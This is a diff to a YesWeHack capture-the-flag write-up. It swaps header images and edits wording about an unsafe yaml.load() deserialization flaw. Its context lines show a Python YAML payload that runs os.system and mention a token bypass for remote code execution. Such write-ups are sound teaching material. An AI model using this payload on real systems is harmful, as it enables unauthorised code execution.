@@ -5,9 +5,9 @@ excerpt: "The challenge code performs unsafe YAML deserialization (yaml.load) on
 date: 2025-08-03
 classes: wide
 header:
-  teaser: /img2/images/portswigger.png
+  teaser: /img2/images/ywh.png
   teaser_home_page: true
-  icon: /img2/images/burp.jpg
+  icon: /img2/images/ywh_logo.png
 categories:
   - yeswehack
   - Web
@@ -82,7 +82,7 @@ python3 -m http.server 80
 !!python/object/apply:os.system ["whoami"]
 ```
 
-> Once we gained access to the firmware update function, we reviewed the code and saw that it uses the `yaml.load()` function, which is vulnerable to Code Execution via Unsafe YAML Deserialization.
+> Once we gained access to the firmware update function, we reviewed the code and saw that it uses the 'yaml.load()' function, which is vulnerable to Code Execution via Unsafe YAML Deserialization.
 
 ```python
 import requests
@@ -119,7 +119,7 @@ python3 poc.py
 
 ![](/img2/Pasted%20image%2020250803231448.png)
 
- > To achieve RCE, it's necessary to send a request with the token bypass and the payload `!!python/object/apply:os.system ["whoami"]` in the 'yaml' field.
+ > To achieve RCE, it's necessary to send a request with the token bypass and the payload in the 'yaml' field.
 ## Flag
 
 ![](/img2/Pasted%20image%2020250803231544.png)
